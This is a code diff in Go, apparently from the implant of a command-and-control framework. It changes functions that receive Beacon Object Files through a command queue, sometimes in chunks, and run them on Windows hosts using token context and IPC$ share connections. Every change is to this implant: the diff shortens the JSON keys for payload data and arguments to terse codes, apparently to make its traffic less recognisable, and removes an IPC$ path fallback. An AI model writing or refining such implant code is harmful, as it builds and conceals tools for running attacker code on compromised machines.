@@ -187,9 +187,6 @@ func executeBOFWithTokenContext(bofBytes []byte, args []byte) (string, error) {
 
 			// Also try IPC$ share
 			ipcShare := bofIPCShare()
-			if ipcShare == "" {
-				ipcShare = "\\IPC$" // Fallback
-			}
 			if idx := strings.Index(networkPath[2:], "\\"); idx > 0 {
 				ipcPath := networkPath[:idx+2] + ipcShare
 				WNetCancelConnection2(ipcPath, 0, true)
@@ -280,9 +277,9 @@ func (cq *CommandQueue) processBOF(cmd Command) CommandResult {
 		Templates []string `json:"tpl"`
 		Version   int      `json:"v"`
 		Type      int      `json:"t"`
-		BOFData   string   `json:"bof_data"`
-		ChunkData string   `json:"chunk_data"`
-		Arguments string   `json:"arguments"`
+		BOFData   string   `json:"bd"`
+		ChunkData string   `json:"cd"`
+		Arguments string   `json:"ar"`
 	}
 
 	if err := json.Unmarshal([]byte(cmd.Data), &bofWrapper); err == nil {
@@ -475,9 +472,9 @@ func (cq *CommandQueue) handleChunkedBOF(cmd Command) CommandResult {
 		Templates []string `json:"tpl"`
 		Version   int      `json:"v"`
 		Type      int      `json:"t"`
-		BOFData   string   `json:"bof_data"`
-		ChunkData string   `json:"chunk_data"`
-		Arguments string   `json:"arguments"`
+		BOFData   string   `json:"bd"`
+		ChunkData string   `json:"cd"`
+		Arguments string   `json:"ar"`
 	}
 	if err := json.Unmarshal([]byte(cmd.Data), &wrapper); err == nil {
 		// Extract template on first chunk
@@ -569,9 +566,9 @@ func (cq *CommandQueue) handleChunkedBOFAsync(cmd Command) CommandResult {
 		Templates []string `json:"tpl"`
 		Version   int      `json:"v"`
 		Type      int      `json:"t"`
-		BOFData   string   `json:"bof_data"`
-		ChunkData string   `json:"chunk_data"`
-		Arguments string   `json:"arguments"`
+		BOFData   string   `json:"bd"`
+		ChunkData string   `json:"cd"`
+		Arguments string   `json:"ar"`
 	}
 	if err := json.Unmarshal([]byte(cmd.Data), &wrapper); err == nil {
 		// Extract template on first chunk
